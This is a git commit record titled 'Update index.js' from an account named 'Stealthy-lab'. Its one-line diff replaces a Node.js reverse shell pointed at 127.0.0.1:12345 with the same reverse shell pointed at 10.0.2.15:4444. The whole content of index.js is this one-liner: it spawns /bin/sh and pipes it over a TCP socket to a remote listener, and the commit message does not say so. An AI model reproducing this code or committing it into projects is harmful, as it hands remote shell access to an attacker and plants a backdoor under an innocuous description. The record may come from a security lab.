ce8228567d2bb9d52568484dcf8d8b12154096f3
St34lthy <108200081+Stealthy-lab@users.noreply.github.com>
2026-08-01 10:59:19 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,1 +1,1 @@
-node -e '(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(12345, "127.0.0.1", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();'
+node -e '(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(4444, "10.0.2.15", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();'
